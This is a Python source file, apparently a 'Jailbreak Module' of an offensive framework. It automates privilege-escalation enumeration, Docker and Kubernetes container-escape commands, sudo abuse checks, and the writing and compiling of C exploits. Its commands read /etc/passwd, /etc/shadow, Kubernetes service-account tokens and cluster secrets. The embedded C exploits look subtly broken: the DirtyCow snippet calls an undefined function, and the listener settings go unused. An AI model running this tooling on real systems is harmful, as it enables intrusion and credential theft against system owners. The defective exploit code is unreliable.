"""
Jailbreak Module - Container & Privilege Escalation Chains
Docker Escape, Kubernetes Escapes, Sudo Abuse, C Exploit Compilation
"""

import requests
import subprocess
import os
import base64
import logging
import json
from pathlib import Path
from datetime import datetime

logger = logging.getLogger("Khora.Jailbreak")

class JailbreakModule:
    def __init__(self, target, lhost, lport):
        self.target = target
        self.lhost = lhost
        self.lport = lport
        self.results = {
            'enumeration': [],
            'exploits': [],
            'status': 'initialized'
        }
        
        Path("logs").mkdir(exist_ok=True)
        Path("results").mkdir(exist_ok=True)
        Path("exploits").mkdir(exist_ok=True)
    
    def enum_privesc(self):
        """Enumerate privilege escalation vectors"""
        print(f"\n[*] Privilege Escalation Enumeration")
        
        enum_commands = {
            'sudo': 'sudo -l 2>/dev/null || echo "no sudo"',
            'suid_binaries': 'find / -perm -4000 -type f 2>/dev/null | head',
            'sudo_group': 'getent group sudo 2>/dev/null',
            'crontab': 'cat /etc/crontab /etc/cron*/* 2>/dev/null | head',
            'passwd_perms': 'ls -la /etc/passwd /etc/shadow 2>/dev/null',
            'kernel_version': 'uname -a',
            'distro': 'cat /etc/*release | head',
            'capabilities': 'getcap -r / 2>/dev/null'
        }
        
        for name, cmd in enum_commands.items():
            try:
                result = subprocess.run(cmd, shell=True, capture_output=True, 
                                      text=True, timeout=5)
                output = result.stdout[:200]
                print(f"  [{name}] {output}")
                self.results['enumeration'].append({
                    'type': name,
                    'command': cmd,
                    'output': output
                })
                logger.info(f"Enum: {name} - {output[:50]}")
            except Exception as e:
                logger.error(f"Enum {name} failed: {e}")
    
    def docker_escape(self):
        """Docker container escape vectors"""
        print(f"\n[*] Docker Container Escape Attempts")
        
        docker_payloads = [
            {
                'name': 'HostProc_Mount',
                'cmd': 'mount -t proc proc /host/proc && cat /host/proc/1/root/etc/passwd',
                'desc': 'Mount host /proc'
            },
            {
                'name': 'nsenter_PID1',
                'cmd': 'nsenter -t 1 -m -u -i -n -p sh -c "id && cat /etc/passwd"',
                'desc': 'Enter host namespace'
            },
            {
                'name': 'DockerEnv_Check',
                'cmd': 'test -f /.dockerenv && echo "Running in Docker" || echo "Not Docker"',
                'desc': 'Check Docker environment'
            },
            {
                'name': 'Cgroup_Escape',
                'cmd': 'cat /proc/self/cgroup | grep -o \'\\[a-f0-9]*\' && find / -name "escaped" 2>/dev/null',
                'desc': 'Cgroup privilege check'
            }
        ]
        
        for payload in docker_payloads:
            try:
                result = subprocess.run(payload['cmd'], shell=True, capture_output=True,
                                      text=True, timeout=5)
                print(f"  [{payload['name']}] {payload['desc']}")
                print(f"    > {result.stdout[:100]}")
                self.results['exploits'].append({
                    'type': 'docker_escape',
                    'name': payload['name'],
                    'description': payload['desc'],
                    'command': payload['cmd'],
                    'result': result.stdout[:100]
                })
            except Exception as e:
                logger.error(f"Docker escape {payload['name']} failed: {e}")
    
    def k8s_escape(self):
        """Kubernetes cluster escape vectors"""
        print(f"\n[*] Kubernetes Escape Attempts")
        
        k8s_payloads = [
            {
                'name': 'ServiceAccount_Token',
                'cmd': 'cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null | head -c 50',
                'desc': 'Read K8s service account token'
            },
            {
                'name': 'K8s_API_Check',
                'cmd': 'kubectl auth can-i create pods --as=system:serviceaccount:default:default 2>/dev/null',
                'desc': 'Check K8s permissions'
            },
            {
                'name': 'Secrets_Access',
                'cmd': 'kubectl get secrets -A 2>/dev/null | head',
                'desc': 'List K8s secrets'
            },
            {
                'name': 'Node_Info',
                'cmd': 'kubectl get nodes -o wide 2>/dev/null',
                'desc': 'Enumerate K8s nodes'
            }
        ]
        
        for payload in k8s_payloads:
            try:
                result = subprocess.run(payload['cmd'], shell=True, capture_output=True,
                                      text=True, timeout=5)
                if result.stdout:
                    print(f"  [{payload['name']}] {payload['desc']}")
                    print(f"    > {result.stdout[:100]}")
                    self.results['exploits'].append({
                        'type': 'k8s_escape',
                        'name': payload['name'],
                        'description': payload['desc'],
                        'result': result.stdout[:100]
                    })
            except Exception as e:
                logger.error(f"K8s escape failed: {e}")
    
    def sudo_abuse(self):
        """Sudo GTFOBins privilege escalation"""
        print(f"\n[*] Sudo Privilege Escalation Vectors")
        
        sudo_exploits = [
            {
                'name': 'GTFOBins_Check',
                'cmd': 'sudo -l 2>/dev/null | grep -E "(vim|less|nano|man|find|apt|apt-get)" | head',
                'desc': 'Check GTFOBins-vulnerable sudo programs'
            },
            {
                'name': 'Sudo_Version',
                'cmd': 'sudo --version 2>/dev/null | head -1',
                'desc': 'Check sudo version for known exploits'
            },
            {
                'name': 'Sudo_Env_Exploit',
                'cmd': 'sudo -l 2>/dev/null | grep -i "env\\|shell" ',
                'desc': 'Check for env/shell override'
            },
            {
                'name': 'Nopasswd_Commands',
                'cmd': 'sudo -l 2>/dev/null | grep NOPASSWD',
                'desc': 'List commands executable without password'
            }
        ]
        
        for exploit in sudo_exploits:
            try:
                result = subprocess.run(exploit['cmd'], shell=True, capture_output=True,
                                      text=True, timeout=5)
                if result.stdout:
                    print(f"  [{exploit['name']}] {exploit['desc']}")
                    print(f"    > {result.stdout[:100]}")
                    self.results['exploits'].append({
                        'type': 'sudo_abuse',
                        'name': exploit['name'],
                        'description': exploit['desc'],
                        'result': result.stdout[:100]
                    })
            except Exception as e:
                logger.error(f"Sudo abuse failed: {e}")
    
    def compile_c_exploits(self):
        """Compile privilege escalation C exploits"""
        print(f"\n[*] Compiling C Exploitation Payloads")
        
        exploits = {
            'dirtycow': '''#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <unistd.h>
#include <pthread.h>

void *madvise_thread(void *arg) {
    char *x = arg;
    while(1) madvise(x, 100, MADV_DONTNEED);
    return NULL;
}

int main(int argc, char **argv) {
    pthread_t t;
    FILE *f;
    char *x;
    f = fopen("/etc/passwd", "rb+");
    x = mmap(0, 4096, PROT_READ, MAP_PRIVATE, fileno(f), 0);
    pthread_create(&t, NULL, madvise_thread, x);
    madvise(x, 4096, MADV_DONTNEED);
    exploit_process(x);
    return 0;
}''',
            
            'kernel_exp': '''#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <sched.h>
#include <sys/types.h>

int main() {
    int ns = unshare(CLONE_NEWUSER|CLONE_NEWNET);
    if (ns == 0) {
        system("id");
        system("cat /proc/1/root/etc/shadow");
    }
    return 0;
}'''
        }
        
        for name, code in exploits.items():
            try:
                exploit_file = Path("exploits") / f"{name}.c"
                with open(exploit_file, 'w') as f:
                    f.write(code)
                
                # Compile
                result = subprocess.run([
                    "gcc", str(exploit_file), 
                    "-o", str(Path("exploits") / name),
                    "-pthread"
                ], capture_output=True, timeout=10)
                
                if result.returncode == 0:
                    print(f"  [✓] {name} compiled")
                    logger.info(f"Compiled: {name}")
                    self.results['exploits'].append({
                        'type': 'compiled_exploit',
                        'name': name,
                        'file': str(Path("exploits") / name)
                    })
                else:
                    print(f"  [✗] {name} compilation failed")
                    logger.error(f"Compilation failed: {name}")
            except Exception as e:
                logger.error(f"Exploit compilation error: {e}")
    
    def save_results(self):
        """Save jailbreak results"""
        try:
            timestamp = datetime.now().strftime('%Y%m%d-%H%M%S')
            results_file = Path("results") / f"jailbreak_results_{timestamp}.json"
            
            with open(results_file, 'w') as f:
                json.dump({
                    'target': self.target,
                    'timestamp': datetime.now().isoformat(),
                    'enumeration': self.results['enumeration'][:10],
                    'exploits': self.results['exploits'][:20]
                }, f, indent=2)
            
            logger.info(f"Results saved: {results_file}")
            
        except Exception as e:
            logger.error(f"Save results failed: {e}")
    
    def run(self):
        """Execute jailbreak chain"""
        print(f"\n{'='*70}")
        print("PRIVILEGE ESCALATION MODULE".center(70))
        print('='*70 + "\n")
        
        logger.info(f"Jailbreak module started for {self.target}")
        
        # 1. Enumeration
        self.enum_privesc()
        
        # 2. Container escapes
        self.docker_escape()
        self.k8s_escape()
        
        # 3. Sudo abuse
        self.sudo_abuse()
        
        # 4. Compile exploits
        self.compile_c_exploits()
        
        # Save results
        self.save_results()
        
        print(f"\n{'='*70}")
        print("PRIVILEGE ESCALATION REVIEW COMPLETE".center(70))
        print("Artifacts: exploits/ | Results: results/".center(70))
        print('='*70 + "\n")

def run(target, lhost, lport=4444):
    """Khora Framework entrypoint - Jailbreak Module"""
    
    print(f"[*] Target: {target}")
    print(f"[*] Listener: {lhost}:{lport}\n")
    
    logger.info(f"Jailbreak module for {target}")
    
    jailbreak = JailbreakModule(target, lhost, lport)
    jailbreak.run()
